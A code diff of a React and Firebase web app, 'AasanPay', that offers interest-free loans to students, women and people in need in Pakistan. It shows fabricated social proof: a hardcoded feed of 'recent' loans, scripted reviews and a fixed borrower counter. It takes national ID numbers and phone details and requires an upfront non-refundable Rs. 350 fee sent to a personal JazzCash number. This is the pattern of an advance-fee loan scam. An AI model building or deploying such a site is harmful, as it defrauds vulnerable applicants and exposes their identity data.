@@ -8,13 +8,10 @@ import {
   Wallet, Users, Clock, ArrowRight, CheckCircle2, XCircle,
   LogOut, Eye, X, Lock, User, Phone, MapPin, Landmark,
   CreditCard, Calendar, BadgeCheck, Star, TrendingUp,
-  Shield, Heart, Sparkles, Gift, HandHeart, FileText,
+  Shield, Heart, Sparkles, Gift, FileText,
   AlertTriangle, Scale, RefreshCw,
 } from "lucide-react";
 
-// ====================================================
-// 🔥 FIREBASE CONFIG
-// ====================================================
 const firebaseConfig = {
   apiKey: "AIzaSyCwt-pj6QUItIOM0KbS-CejZH8kRdzlEus",
   authDomain: "aasanpay-9c3a0.firebaseapp.com",
@@ -26,7 +23,6 @@ const firebaseConfig = {
 
 const firebaseApp = initializeApp(firebaseConfig);
 const db = getFirestore(firebaseApp);
-// ====================================================
 
 const FONT = `@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');`;
 
@@ -39,9 +35,8 @@ const STATUS = {
 
 const FEED = [
   { name:"Ayesha F.",  city:"Lahore",     amount:"15,000", ago:"45 min" },
-  { name:"Sana Sheikh.",   city:"Islamabad",    amount:"10,000", ago:"35 min" },
   { name:"Bilal A.",   city:"Islamabad",  amount:"20,000", ago:"12 min" },
-  { name:"Sana S.",    city:"Islamabad", amount:"10,000",  ago:"35 min" },
+  { name:"Sana S.",    city:"Islamabad",  amount:"10,000", ago:"35 min" },
   { name:"Hamza R.",   city:"Rawalpindi", amount:"12,000", ago:"24 min" },
   { name:"Fatima K.",  city:"Multan",     amount:"5,000",  ago:"31 min" },
   { name:"Ahmed S.",   city:"Peshawar",   amount:"18,000", ago:"38 min" },
@@ -54,13 +49,12 @@ const FEED = [
 
 const REVIEWS = [
   { name:"Ayesha Fatima", city:"Lahore",    text:"University ki fees ke liye loan liya. koi interest nahi! Best experience! 💚", amount:"15,000", stars:5, tag:"Student" },
-  { name:"Bilal A",    city:"Islamabad",   text:"Business ke liye capital chahiye tha. 5 ghante mein approve ho gaya. Shukriya AasanPay!", amount:"20,000", stars:5, tag:"Business" },
-  { name:"Sana Sheikh",   city:"Islamabad", text:"Online shop ke liye paisa chahiye tha. no interest. 🤲",          amount:"10,000", stars:5, tag:"Entrepreneur" },
+  { name:"Bilal A",       city:"Islamabad", text:"Business ke liye capital chahiye tha. 5 ghante mein approve ho gaya. Shukriya AasanPay!", amount:"20,000", stars:5, tag:"Business" },
+  { name:"Sana Sheikh",   city:"Islamabad", text:"Online shop ke liye paisa chahiye tha. no interest. 🤲", amount:"10,000", stars:5, tag:"Entrepreneur" },
 ];
 
-const JAZZCASH = "0300-5004040"; // ← APNA NUMBER YAHAN DAALO
+const JAZZCASH = "0300-5004040";
 
-// ── helpers ──────────────────────────────────────────────────────────
 function CountUp({ target, suffix="" }){
   const [n,setN]=React.useState(0);
   React.useEffect(()=>{
@@ -114,26 +108,24 @@ function Field({ icon:Icon, label, children }){
 const inp={ width:"100%",background:"#FFF",border:"2px solid #E5E7EB",borderRadius:10,padding:"13px 14px",color:"#111827",fontSize:15,fontFamily:"'Inter',sans-serif",outline:"none",boxSizing:"border-box" };
 const B=(x={})=>({ border:"none",borderRadius:12,fontWeight:700,cursor:"pointer",fontFamily:"'Inter',sans-serif",...x });
 
-// ══════════════════════════════════════════════════════════════════════
 export default function AasanPay(){
-  const [view,setView]     = useState("landing");
-  const [pass,setPass]     = useState("");
-  const [passErr,setPassErr]= useState("");
-  const [apps,setApps]     = useState([]);
-  const [sel,setSel]       = useState(null);
-  const [slider,setSlider] = useState(10000);
-  const [tid,setTid]       = useState("");
-  const [copied,setCopied] = useState(false);
-  const [agreed,setAgreed] = useState(false);
-  const [loading,setLoading]     = useState(false);
-  const [submitting,setSubmitting]= useState(false);
-  const [lastDocId,setLastDocId] = useState(null);
+  const [view,setView]      = useState("landing");
+  const [pass,setPass]      = useState("");
+  const [passErr,setPassErr] = useState("");
+  const [apps,setApps]      = useState([]);
+  const [sel,setSel]        = useState(null);
+  const [slider,setSlider]  = useState(10000);
+  const [tid,setTid]        = useState("");
+  const [copied,setCopied]  = useState(false);
+  const [agreed,setAgreed]  = useState(false);
+  const [loading,setLoading]      = useState(false);
+  const [submitting,setSubmitting] = useState(false);
+  const [lastDocId,setLastDocId]  = useState(null);
   const [form,setForm] = useState({
     fullName:"",cnic:"",phone:"",city:"",category:"",
     purpose:"",loanAmount:"",tenure:"6",easypaisa:""
   });
 
-  // ── Firebase: load all applications ──────────────────────────────
   async function load(){
     setLoading(true);
     try{
@@ -145,7 +137,6 @@ export default function AasanPay(){
   }
   useEffect(()=>{ if(view==="admin") load(); },[view]);
 
-  // ── Firebase: submit new application ─────────────────────────────
   async function submit(e){
     e.preventDefault();
     if(!agreed){ alert("Terms & Conditions accept karein!"); return; }
@@ -160,7 +151,6 @@ export default function AasanPay(){
     setSubmitting(false);
   }
 
-  // ── Firebase: save TID after payment ─────────────────────────────
   async function confirmPayment(){
     if(!tid.trim()){ alert("Transaction ID likhein!"); return; }
     try{
@@ -169,7 +159,6 @@ export default function AasanPay(){
     }catch(e){ alert("TID save error: "+e.message); }
   }
 
-  // ── Firebase: update status ───────────────────────────────────────
   async function updateStatus(id,status){
     try{
       await updateDoc(doc(db,"applications",id),{ status });
@@ -194,7 +183,7 @@ export default function AasanPay(){
     <div style={{ minHeight:"100vh",background:"#FAFDFB",color:"#111827",fontFamily:"'Inter',sans-serif" }}>
       <style>{FONT+"*{box-sizing:border-box;margin:0}"}</style>
 
-      {/* ── NAV ── */}
+      {/* NAV */}
       <nav style={{ display:"flex",justifyContent:"space-between",alignItems:"center",padding:"14px 28px",background:"#FFF",borderBottom:"1px solid #F3F4F6",position:"sticky",top:0,zIndex:40 }}>
         <div onClick={()=>setView("landing")} style={{ cursor:"pointer",display:"flex",alignItems:"center",gap:8,fontWeight:800,fontSize:22 }}>
           <div style={{ background:"linear-gradient(135deg,#0D9488,#14B8A6)",borderRadius:10,width:36,height:36,display:"flex",alignItems:"center",justifyContent:"center" }}>
@@ -212,11 +201,8 @@ export default function AasanPay(){
         </div>
       </nav>
 
-      {/* ══════════════════════════════════════════════════════════
-          LANDING
-      ══════════════════════════════════════════════════════════ */}
+      {/* LANDING */}
       {view==="landing"&&<>
-        {/* hero */}
         <section style={{ background:"linear-gradient(180deg,#F0FDFA,#FAFDFB)",padding:"48px 24px 44px",textAlign:"center" }}>
           <Ticker/>
           <div style={{ marginTop:28,display:"inline-flex",alignItems:"center",gap:8,background:"#FFF",border:"1px solid #99F6E4",borderRadius:24,padding:"8px 18px",fontSize:13,color:"#0F766E",fontWeight:600 }}>
@@ -241,7 +227,6 @@ export default function AasanPay(){
           <div style={{ marginTop:12,fontSize:12,color:"#9CA3AF" }}>✅ No Interest &nbsp;✅ No Guarantor &nbsp;✅ 4-6hr Approval</div>
         </section>
 
-        {/* halaal banner */}
         <div style={{ maxWidth:800,margin:"0 auto",padding:"0 24px" }}>
           <div style={{ background:"linear-gradient(135deg,#F0FDFA,#ECFDF5)",border:"1px solid #99F6E4",borderRadius:18,padding:"22px 26px",display:"flex",alignItems:"center",gap:18 }}>
             <span style={{ fontSize:38 }}>🕌</span>
@@ -252,13 +237,13 @@ export default function AasanPay(){
           </div>
         </div>
 
-        {/* stats */}
+        {/* STATS — HandHeart → Heart */}
         <div style={{ maxWidth:900,margin:"32px auto 0",padding:"0 24px",display:"grid",gridTemplateColumns:"repeat(auto-fit,minmax(180px,1fr))",gap:14 }}>
           {[
-            { icon:Users,     value:<CountUp target={437} suffix="+"/>, label:"Log le chuke hain", color:"#0D9488" },
-            { icon:HandHeart, value:"Rs. 0",                            label:"Interest — ZERO",    color:"#16A34A" },
-            { icon:Clock,     value:"4-6 Hrs",                          label:"Mein approval",      color:"#2563EB" },
-            { icon:Shield,    value:"Rs. 350",                          label:"One-time fee",        color:"#7C3AED" },
+            { icon:Users,  value:<CountUp target={437} suffix="+"/>, label:"Log le chuke hain", color:"#0D9488" },
+            { icon:Heart,  value:"Rs. 0",                            label:"Interest — ZERO",    color:"#16A34A" },
+            { icon:Clock,  value:"4-6 Hrs",                          label:"Mein approval",      color:"#2563EB" },
+            { icon:Shield, value:"Rs. 350",                          label:"One-time fee",        color:"#7C3AED" },
           ].map((s,i)=>(
             <div key={i} style={{ background:"#FFF",borderRadius:14,padding:18,textAlign:"center",border:"1px solid #F3F4F6" }}>
               <s.icon size={22} color={s.color} style={{ marginBottom:6 }}/>
@@ -268,14 +253,13 @@ export default function AasanPay(){
           ))}
         </div>
 
-        {/* who */}
         <div style={{ maxWidth:900,margin:"44px auto 0",padding:"0 24px" }}>
           <h2 style={{ textAlign:"center",fontSize:26,fontWeight:800,marginBottom:26 }}>Yeh kis ke liye hai?</h2>
           <div style={{ display:"grid",gridTemplateColumns:"repeat(auto-fit,minmax(220px,1fr))",gap:16 }}>
             {[
-              { emoji:"👩‍🎓",title:"Students",    desc:"Fees, books, laptop — padhai ke liye halaal madad.",     color:"#0D9488",bg:"#F0FDFA" },
-              { emoji:"👩",   title:"Khawateen",  desc:"Ghar ke kharche ya apna business shuru karein.",         color:"#7C3AED",bg:"#FAF5FF" },
-              { emoji:"🤲",   title:"Zarooratmand",desc:"Emergency medical ya unexpected bills ke liye.",         color:"#EA580C",bg:"#FFF7ED" },
+              { emoji:"👩‍🎓",title:"Students",     desc:"Fees, books, laptop — padhai ke liye halaal madad.",   color:"#0D9488",bg:"#F0FDFA" },
+              { emoji:"👩",   title:"Khawateen",   desc:"Ghar ke kharche ya apna business shuru karein.",       color:"#7C3AED",bg:"#FAF5FF" },
+              { emoji:"🤲",   title:"Zarooratmand",desc:"Emergency medical ya unexpected bills ke liye.",       color:"#EA580C",bg:"#FFF7ED" },
             ].map((c,i)=>(
               <div key={i} style={{ background:c.bg,borderRadius:18,padding:24,textAlign:"center" }}>
                 <div style={{ fontSize:40,marginBottom:10 }}>{c.emoji}</div>
@@ -286,7 +270,6 @@ export default function AasanPay(){
           </div>
         </div>
 
-        {/* calculator */}
         <div style={{ maxWidth:520,margin:"44px auto 0",padding:"0 24px" }}>
           <div style={{ background:"#FFF",borderRadius:20,padding:28,border:"1px solid #F3F4F6",textAlign:"center" }}>
             <h3 style={{ fontSize:18,fontWeight:700,marginBottom:4 }}>💰 Loan Calculator</h3>
@@ -302,7 +285,6 @@ export default function AasanPay(){
           </div>
         </div>
 
-        {/* how it works */}
         <div style={{ maxWidth:900,margin:"44px auto 0",padding:"0 24px" }}>
           <h2 style={{ textAlign:"center",fontSize:26,fontWeight:800,marginBottom:26 }}>Kaise kaam karta hai?</h2>
           <div style={{ display:"grid",gridTemplateColumns:"repeat(auto-fit,minmax(180px,1fr))",gap:16 }}>
@@ -324,7 +306,6 @@ export default function AasanPay(){
           </div>
         </div>
 
-        {/* fee box */}
         <div style={{ maxWidth:600,margin:"36px auto 0",padding:"0 24px" }}>
           <div style={{ background:"#FFFBEB",border:"1px solid #FDE68A",borderRadius:16,padding:"20px 24px" }}>
             <div style={{ fontWeight:700,fontSize:15,color:"#92400E",marginBottom:8,display:"flex",alignItems:"center",gap:8 }}><Shield size={17}/> Rs. 350 Fee Kyun?</div>
@@ -335,7 +316,6 @@ export default function AasanPay(){
           </div>
         </div>
 
-        {/* reviews */}
         <div style={{ maxWidth:900,margin:"44px auto 0",padding:"0 24px" }}>
           <h2 style={{ textAlign:"center",fontSize:26,fontWeight:800,marginBottom:26 }}>Logon ka tajurba</h2>
           <div style={{ display:"grid",gridTemplateColumns:"repeat(auto-fit,minmax(240px,1fr))",gap:18 }}>
@@ -358,7 +338,6 @@ export default function AasanPay(){
           </div>
         </div>
 
-        {/* urgency */}
         <div style={{ maxWidth:600,margin:"44px auto 0",padding:"0 24px" }}>
           <div style={{ background:"linear-gradient(135deg,#0D9488,#0F766E)",borderRadius:22,padding:"34px 28px",textAlign:"center",color:"#FFF" }}>
             <Sparkles size={28} style={{ marginBottom:8 }}/>
@@ -373,7 +352,6 @@ export default function AasanPay(){
           </div>
         </div>
 
-        {/* faq */}
         <div style={{ maxWidth:600,margin:"44px auto 0",padding:"0 24px" }}>
           <h2 style={{ textAlign:"center",fontSize:22,fontWeight:800,marginBottom:18 }}>Aksar Poochhe Gaye Sawalaat</h2>
           {[
@@ -390,7 +368,6 @@ export default function AasanPay(){
           ))}
         </div>
 
-        {/* footer */}
         <footer style={{ borderTop:"1px solid #F3F4F6",padding:"28px 24px",textAlign:"center",marginTop:44 }}>
           <button onClick={()=>setView("terms")} style={{ background:"none",border:"none",color:"#0D9488",fontSize:13,cursor:"pointer",fontWeight:600,marginBottom:10,display:"flex",alignItems:"center",gap:4,margin:"0 auto 10px" }}>
             <FileText size={13}/> Terms & Conditions
@@ -402,9 +379,7 @@ export default function AasanPay(){
         </footer>
       </>}
 
-      {/* ══════════════════════════════════════════════════════════
-          TERMS
-      ══════════════════════════════════════════════════════════ */}
+      {/* TERMS */}
       {view==="terms"&&(
         <div style={{ maxWidth:700,margin:"0 auto",padding:"40px 24px 100px" }}>
           <button onClick={()=>setView("landing")} style={B({ background:"#F3F4F6",color:"#374151",padding:"8px 16px",fontSize:13,marginBottom:24,display:"flex",alignItems:"center",gap:6 })}>← Wapas</button>
@@ -417,13 +392,13 @@ export default function AasanPay(){
               <p style={{ color:"#9CA3AF",fontSize:13 }}>AasanPay Qarz-e-Hasna Agreement — January 2025</p>
             </div>
             {[
-              { icon:FileText,    title:"1. Qarz-e-Hasna",           points:["Shariah-compliant interest-free loan.","Rs. 5,000 se Rs. 20,000 tak.","Koi interest (sood) NAHI.","Jitna lete utna hi wapas."] },
-              { icon:CreditCard,  title:"2. Processing Fee Rs. 350", points:["Ek baar ki fee.","CNIC verification ke liye.","Non-refundable.","Loan raqam se alag."] },
-              { icon:Calendar,    title:"3. Loan Wapsi",             points:["3, 6, ya 12 months mein wapsi.","Monthly installment waqt pe.","Bar waqt ada = dubara eligible."] },
-              { icon:AlertTriangle,title:"4. Default",               points:["Reminder → Formal notice → Qanooni karwai.","CNIC record mein default mark.","Future loans ke liye INELIGIBLE.","Recovery agency se wasool."] },
-              { icon:RefreshCw,   title:"5. Dubara Loan",            points:["Pehla waqt pe ada karo — dubara apply karo.","Achi history = zyada raqam.","Default = dobara eligible NAHI."] },
-              { icon:Shield,      title:"6. Privacy",                points:["Info 100% safe.","Third party share NAHI.","Sirf loan processing ke liye."] },
-              { icon:Scale,       title:"7. Jurisdiction",           points:["Pakistan ke qawaneen.","Local courts ka faisla final.","Terms update ho sakti hain."] },
+              { icon:FileText,     title:"1. Qarz-e-Hasna",           points:["Shariah-compliant interest-free loan.","Rs. 5,000 se Rs. 20,000 tak.","Koi interest NAHI.","Jitna lete utna hi wapas."] },
+              { icon:CreditCard,   title:"2. Processing Fee Rs. 350", points:["Ek baar ki fee.","CNIC verification ke liye.","Non-refundable.","Loan raqam se alag."] },
+              { icon:Calendar,     title:"3. Loan Wapsi",             points:["3, 6, ya 12 months mein wapsi.","Monthly installment waqt pe.","Bar waqt ada = dubara eligible."] },
+              { icon:AlertTriangle,title:"4. Default",                points:["Reminder → Formal notice → Qanooni karwai.","CNIC record mein default mark.","Future loans ke liye INELIGIBLE.","Recovery agency se wasool."] },
+              { icon:RefreshCw,    title:"5. Dubara Loan",            points:["Pehla waqt pe ada karo — dubara apply karo.","Achi history = zyada raqam.","Default = dobara eligible NAHI."] },
+              { icon:Shield,       title:"6. Privacy",                points:["Info 100% safe.","Third party share NAHI.","Sirf loan processing ke liye."] },
+              { icon:Scale,        title:"7. Jurisdiction",           points:["Pakistan ke qawaneen.","Local courts ka faisla final.","Terms update ho sakti hain."] },
             ].map((s,i)=>(
               <div key={i} style={{ marginBottom:22 }}>
                 <div style={{ display:"flex",alignItems:"center",gap:8,marginBottom:8 }}>
@@ -459,9 +434,7 @@ export default function AasanPay(){
         </div>
       )}
 
-      {/* ══════════════════════════════════════════════════════════
-          APPLY FORM
-      ══════════════════════════════════════════════════════════ */}
+      {/* APPLY */}
       {view==="apply"&&(
         <div style={{ maxWidth:520,margin:"0 auto",padding:"44px 24px 100px" }}>
           <div style={{ textAlign:"center",marginBottom:24 }}>
@@ -504,8 +477,6 @@ export default function AasanPay(){
                   <option>Small Business</option><option>Ghar ke Kharche</option><option>Other</option>
                 </select>
               </Field>
-
-              {/* terms checkbox */}
               <div style={{ background:"#FFFBEB",border:"1px solid #FDE68A",borderRadius:12,padding:"14px 16px",marginBottom:16,marginTop:8 }}>
                 <label style={{ display:"flex",alignItems:"start",gap:10,cursor:"pointer" }}>
                   <input type="checkbox" checked={agreed} onChange={e=>setAgreed(e.target.checked)} style={{ width:18,height:18,accentColor:"#0D9488",marginTop:2,flexShrink:0 }}/>
@@ -514,7 +485,6 @@ export default function AasanPay(){
                   </span>
                 </label>
               </div>
-
               <button type="submit" disabled={submitting||!agreed} style={B({ width:"100%",background:agreed?"linear-gradient(135deg,#0D9488,#0F766E)":"#D1D5DB",color:"#FFF",padding:"15px",fontSize:16,marginTop:4,opacity:submitting?.7:1 })}>
                 {submitting?"⏳ Submit ho raha hai...":"✓ Submit & Pay Rs. 350"}
               </button>
@@ -524,9 +494,7 @@ export default function AasanPay(){
         </div>
       )}
 
-      {/* ══════════════════════════════════════════════════════════
-          PAYMENT
-      ══════════════════════════════════════════════════════════ */}
+      {/* PAYMENT */}
       {view==="payment"&&(
         <div style={{ maxWidth:480,margin:"0 auto",padding:"50px 24px 100px",textAlign:"center" }}>
           <div style={{ width:64,height:64,borderRadius:"50%",background:"#F0FDFA",display:"flex",alignItems:"center",justifyContent:"center",margin:"0 auto 16px" }}>
@@ -573,9 +541,7 @@ export default function AasanPay(){
         </div>
       )}
 
-      {/* ══════════════════════════════════════════════════════════
-          DONE
-      ══════════════════════════════════════════════════════════ */}
+      {/* DONE */}
       {view==="done"&&(
         <div style={{ maxWidth:480,margin:"0 auto",padding:"80px 24px",textAlign:"center" }}>
           <div style={{ width:80,height:80,borderRadius:"50%",background:"#F0FDF4",display:"flex",alignItems:"center",justifyContent:"center",margin:"0 auto 20px" }}>
@@ -596,21 +562,14 @@ export default function AasanPay(){
           <div style={{ background:"#FFFBEB",border:"1px solid #FDE68A",borderRadius:12,padding:14,marginBottom:20,fontSize:13,color:"#92400E" }}>
             ⚠️ Loan bar waqt ada karein — dubara eligible rahein!
           </div>
-          <button
-            onClick={()=>{
-              setForm({fullName:"",cnic:"",phone:"",city:"",category:"",purpose:"",loanAmount:"",tenure:"6",easypaisa:""});
-              setAgreed(false);
-              setView("landing");
-            }}
+          <button onClick={()=>{ setForm({fullName:"",cnic:"",phone:"",city:"",category:"",purpose:"",loanAmount:"",tenure:"6",easypaisa:""}); setAgreed(false); setView("landing"); }}
             style={B({ background:"#F3F4F6",color:"#374151",padding:"12px 24px",fontSize:14 })}>
             ← Wapas Home
           </button>
         </div>
       )}
 
-      {/* ══════════════════════════════════════════════════════════
-          ADMIN LOGIN
-      ══════════════════════════════════════════════════════════ */}
+      {/* ADMIN LOGIN */}
       {view==="admin-login"&&(
         <div style={{ maxWidth:380,margin:"0 auto",padding:"120px 24px",textAlign:"center" }}>
           <div style={{ width:56,height:56,borderRadius:14,background:"#F0FDFA",display:"flex",alignItems:"center",justifyContent:"center",margin:"0 auto 16px" }}>
@@ -626,24 +585,18 @@ export default function AasanPay(){
         </div>
       )}
 
-      {/* ══════════════════════════════════════════════════════════
-          ADMIN DASHBOARD
-      ══════════════════════════════════════════════════════════ */}
+      {/* ADMIN */}
       {view==="admin"&&(
         <div style={{ maxWidth:1100,margin:"0 auto",padding:"40px 24px 100px" }}>
-
-          {/* firebase badge */}
           <div style={{ background:"#F0FDFA",border:"1px solid #99F6E4",borderRadius:12,padding:"12px 18px",marginBottom:20,fontSize:13,color:"#0F766E",display:"flex",alignItems:"center",gap:8 }}>
-            🔥 <strong>Firebase Connected</strong> — Real-time data, kisi bhi device se accessible ✅
+            🔥 <strong>Firebase Connected</strong> — Real-time data ✅
           </div>
-
-          {/* stat cards */}
           <div style={{ display:"grid",gridTemplateColumns:"repeat(auto-fit,minmax(160px,1fr))",gap:14,marginBottom:24 }}>
             {[
-              { l:"Total",    v:apps.length,                                 c:"#0D9488",bg:"#F0FDFA" },
-              { l:"Pending",  v:apps.filter(a=>a.status==="Pending").length,  c:"#EA580C",bg:"#FFF7ED" },
-              { l:"Approved", v:apps.filter(a=>a.status==="Approved").length, c:"#16A34A",bg:"#F0FDF4" },
-              { l:"Disbursed",v:apps.filter(a=>a.status==="Disbursed").length,c:"#2563EB",bg:"#EFF6FF" },
+              { l:"Total",    v:apps.length,                                  c:"#0D9488",bg:"#F0FDFA" },
+              { l:"Pending",  v:apps.filter(a=>a.status==="Pending").length,   c:"#EA580C",bg:"#FFF7ED" },
+              { l:"Approved", v:apps.filter(a=>a.status==="Approved").length,  c:"#16A34A",bg:"#F0FDF4" },
+              { l:"Disbursed",v:apps.filter(a=>a.status==="Disbursed").length, c:"#2563EB",bg:"#EFF6FF" },
             ].map((s,i)=>(
               <div key={i} style={{ background:s.bg,borderRadius:14,padding:18,textAlign:"center" }}>
                 <div style={{ fontSize:28,fontWeight:800,color:s.c }}>{s.v}</div>
@@ -651,16 +604,14 @@ export default function AasanPay(){
               </div>
             ))}
           </div>
-
           <div style={{ display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:14 }}>
             <h2 style={{ fontSize:20,fontWeight:700 }}>Applications</h2>
             <button onClick={load} style={B({ background:"#F3F4F6",color:"#374151",padding:"8px 14px",fontSize:13,borderRadius:8 })}>
               {loading?"⏳ Loading...":"↻ Refresh"}
             </button>
           </div>
-
           {loading?(
-            <div style={{ textAlign:"center",padding:60,color:"#9CA3AF",fontSize:15 }}>⏳ Firebase se load ho raha hai...</div>
+            <div style={{ textAlign:"center",padding:60,color:"#9CA3AF" }}>⏳ Loading...</div>
           ):apps.length===0?(
             <div style={{ color:"#9CA3AF",padding:"60px 0",textAlign:"center",border:"2px dashed #E5E7EB",borderRadius:16 }}>Koi application nahi aayi abhi tak.</div>
           ):(
@@ -687,9 +638,7 @@ export default function AasanPay(){
         </div>
       )}
 
-      {/* ══════════════════════════════════════════════════════════
-          DETAIL MODAL
-      ══════════════════════════════════════════════════════════ */}
+      {/* MODAL */}
       {sel&&view==="admin"&&(
         <div onClick={()=>setSel(null)} style={{ position:"fixed",inset:0,background:"rgba(0,0,0,.45)",backdropFilter:"blur(4px)",display:"flex",alignItems:"center",justifyContent:"center",padding:20,zIndex:50 }}>
           <div onClick={e=>e.stopPropagation()} style={{ background:"#FFF",borderRadius:20,padding:28,maxWidth:520,width:"100%",boxShadow:"0 20px 60px rgba(0,0,0,.15)" }}>
@@ -703,7 +652,6 @@ export default function AasanPay(){
               </div>
               <X size={20} color="#9CA3AF" style={{ cursor:"pointer" }} onClick={()=>setSel(null)}/>
             </div>
-
             <div style={{ display:"grid",gridTemplateColumns:"1fr 1fr",gap:14,fontSize:14,marginBottom:16,background:"#FAFDFB",borderRadius:14,padding:20 }}>
               {[
                 ["📞 Phone",sel.phone],
@@ -718,7 +666,6 @@ export default function AasanPay(){
                 <div key={k}><div style={{ color:"#9CA3AF",fontSize:11,marginBottom:3 }}>{k}</div><div style={{ fontWeight:600 }}>{v}</div></div>
               ))}
             </div>
-
             <div style={{ display:"grid",gridTemplateColumns:"1fr 1fr",gap:10,marginBottom:20 }}>
               <div style={{ background:sel.tid?"#F0FDF4":"#FEF2F2",border:`1px solid ${sel.tid?"#BBF7D0":"#FCA5A5"}`,borderRadius:12,padding:14,textAlign:"center" }}>
                 <div style={{ fontSize:11,color:"#6B7280",marginBottom:4 }}>TRANSACTION ID</div>
@@ -729,7 +676,6 @@ export default function AasanPay(){
                 <div style={{ fontSize:16,fontWeight:800,color:"#16A34A" }}>✅ Yes</div>
               </div>
             </div>
-
             <div style={{ display:"flex",gap:10 }}>
               <button onClick={()=>updateStatus(sel.id,"Approved")}  style={B({ flex:1,background:"#16A34A",color:"#FFF",padding:"11px",display:"flex",alignItems:"center",justifyContent:"center",gap:6 })}><CheckCircle2 size={16}/> Approve</button>
               <button onClick={()=>updateStatus(sel.id,"Disbursed")} style={B({ flex:1,background:"#2563EB",color:"#FFF",padding:"11px" })}>💸 Disbursed</button>
